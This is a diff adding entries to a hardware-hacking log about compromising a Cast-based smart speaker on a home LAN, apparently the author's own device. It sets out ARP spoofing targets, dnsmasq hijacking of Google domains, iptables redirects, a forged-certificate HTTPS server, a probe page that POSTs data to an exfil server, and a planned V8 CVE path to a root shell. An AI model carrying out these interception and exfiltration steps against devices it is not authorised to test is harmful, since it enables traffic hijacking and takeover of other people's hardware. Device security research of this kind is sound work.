@@ -731,3 +731,136 @@ Cast receiver environment. They may expose:
 **Reconnaissance page** — extend `probe.html` to enumerate all `chrome.cast.*` and
 `cast.framework.*` properties and exfil the list. This maps the JS API surface
 available to an arbitrary Cast receiver for further attack surface research.
+
+---
+
+## Network exploitation phase (2026-11-11)
+
+> Device is now provisioned on the home LAN at **192.168.1.29**, firmware
+> **3.78.540761**, Chrome **92.0.4515.0**. The BLE/setup-AP surface is gone;
+> all new evidence comes from Cast port 8009, the local HTTP API (8008), and
+> active MITM.
+
+### F19. Firmware / Chrome version confirmed post-provisioning
+
+| Field | Value |
+| --- | --- |
+| IP | 192.168.1.29 (Livebox-C5C0 LAN) |
+| MAC | 44:07:0B:D2:6F:36 |
+| `cast_build_revision` | 3.78.540761 |
+| `build_version` | 540761 |
+| Chrome | 92.0.4515.0 (from Cast SDK UA) |
+| `release_track` | stable-channel |
+| OTA | `has_update: false` — still never updated |
+| Uptime evidence | `evidence/` — eureka_info captured via port 8008 |
+
+Open ports on the provisioned device: **8008** (Cast HTTP API, no auth for
+GET), **8443** (HTTPS API, 401 on most endpoints), **8009** (Cast control
+TLS), **9000** (mTLS Audio Assist, see F25), **10001** (Google Zone).
+
+### F20. ARP MITM operational — cast_shell fetches media from our server
+
+`scripts/mitm-setup-root.sh` + `scripts/mitm-attack.sh` install:
+
+- **arpspoof** (both directions: `-t 192.168.1.29 192.168.1.1` and `-t 192.168.1.1 192.168.1.29`)
+- **dnsmasq** on port 5354 — answers `clients3.google.com`, `www.gstatic.com`, `*.googleapis.com` → 192.168.1.24
+- **iptables PREROUTING REDIRECT** (src 192.168.1.29): UDP/TCP 53→5354, TCP 80→8080, TCP 443→4443
+- **mitm_https_server** on port 4443 — TLS (CN=clients3.google.com, SANs *.google.com / *.googleapis.com), serves fake Cast registry JSON pointing to `http://192.168.1.24:8080/probe.html`
+- **exfil_server** on port 8080 — serves probe.html and logs all POSTs from the device
+
+**Key confirmation:** `LOAD` of `audio/mpeg` from `http://192.168.1.24:8080/silence.mp3`
+resulted in `playerState: PLAYING`. Mini's cast_shell **does** make direct HTTP
+connections to our server for media content. VTT subtitle tracks (`captions.vtt`)
+are fetched alongside audio when `activeTrackIds` is set.
+
+```
+[page] 192.168.1.29 "GET /silence.mp3 HTTP/1.1" 200 -
+[page] 192.168.1.29 "GET /captions.vtt HTTP/1.1" 200 -
+```
+
+### F21. CVE-2021-30563 (V8 type confusion) — APPLICABLE on Chrome/92.0.4515.0
+
+Chrome/92.0.4515.0 is **pre-release** (the patch landed in 92.0.4515.107).
+CVE-2021-30563 affects Chrome < 92.0.4515.107 — this device is in that window.
+
+The exploit requires JavaScript execution inside cast_shell's renderer. That
+execution primitive comes from the boot-time registry intercept (F22), not from the
+media-load path.
+
+### F22. cast_shell receiver URLs are locally cached — boot-time intercept required
+
+**Critical finding:** cast_shell makes **zero TCP 443 connections** during LAUNCH,
+even for unknown app IDs. The receiver HTML URL is 100 % locally cached. The
+Cast registry (`clients3.google.com/cast/v2/receiver`) is only fetched at boot time
+(or on a cast daemon restart), never during a normal LAUNCH cycle.
+
+**Consequence:** The MITM HTTPS server on port 4443 (with correct CN/SAN cert for
+clients3.google.com) can only intercept that registry fetch if cast_shell
+re-initialises — which requires either a device power cycle or a cast daemon crash.
+
+**Attack flow once power cycle happens:**
+1. Mini boots → cast daemon starts with empty state
+2. DNS request for `clients3.google.com` → dnsmasq returns 192.168.1.24
+3. TCP 443 from Mini → iptables REDIRECT → port 4443
+4. mitm_https_server responds with registry JSON: `"url": "http://192.168.1.24:8080/probe.html"`
+5. cast_shell navigates to probe.html → JavaScript executes in cast_shell's Chromium
+6. probe.html reports SQLite version, V8 surface, Cast SDK APIs via POST to exfil_server
+
+**Current status:** infrastructure fully operational. Awaiting one device power
+cycle to trigger the boot window.
+
+### F23. WebVTT subtitle injection — not viable on Chrome 92
+
+Injecting `<img onerror=...>`, `<script>`, or HTML breakout sequences into WebVTT
+cue text has no effect. Chrome's WebVTT renderer uses an allowlisted shadow tree
+(`<b>`, `<i>`, `<u>`, `<c>`, `<v>`, `<ruby>`, `<rt>`) and strips all other tags
+before DOM insertion. No XSS callback was received from any payload tested.
+
+### F24. HLS LOAD confirmed — M3U8 playlist fetched repeatedly by cast_shell
+
+`LOAD` with `contentType: application/x-mpegURL` and `contentId:
+http://192.168.1.24:8080/stream.m3u8` causes cast_shell to fetch the playlist
+every few seconds. The TS segment currently served is not decoded correctly by
+the Default Media Receiver. When a valid TS is substituted, HLS playback should
+work. This confirms HTTP reachability for all media content types.
+
+**HLS AES-128 key attack note:** Including `EXT-X-KEY:METHOD=AES-128,
+URI="https://clients3.google.com/aes-key"` in the playlist would force a fresh
+TCP 443 connection (interceptable via iptables REDIRECT). This is an alternative
+boot-less path to the registry intercept but only delivers 16 raw key bytes, not JS
+execution.
+
+### F25. Port 9000 — mTLS Audio Assist service, cannot connect without device cert
+
+```
+depth=1 O=Google Inc, OU=Cast, CN=Chromecast ICA 7 (Audio Assist 2)
+depth=0 O=Google Inc, OU=Cast, CN=L39IRU
+```
+
+Port 9000 presents a device-specific TLS certificate issued by Google's
+Chromecast Audio Assist CA. The handshake fails without a matching client
+certificate (mTLS). The device cert private key resides in `factory_store`
+(mtd10) and cannot be extracted without shell access or a NAND dump. **Dead end
+until root is obtained.**
+
+---
+
+## Attack status (2026-11-11)
+
+| Step | Status |
+| --- | --- |
+| ARP MITM | ✅ operational |
+| DNS hijack (dnsmasq 5354) | ✅ operational |
+| HTTPS MITM server (port 4443, CN=clients3.google.com) | ✅ operational |
+| Fake registry → probe.html URL | ✅ serving correctly |
+| exfil_server (port 8080) | ✅ operational, logs Mini's requests |
+| cast_shell media fetch (audio + VTT) | ✅ confirmed working |
+| Boot-time registry intercept | ⏳ **waiting for power cycle** |
+| JS execution in cast_shell | ⏳ blocked on above |
+| SQLite version / Magellan probe | ⏳ blocked on JS |
+| V8 (CVE-2021-30563) surface check | ⏳ blocked on JS |
+| Shell access | ⏳ blocked on exploit |
+
+**ETA**: One 5-second physical action (power cycle) → 30-60 s boot window → JS
+executes → 1–5 days to weaponise Magellan or V8 → root shell → LLM replacement.
+
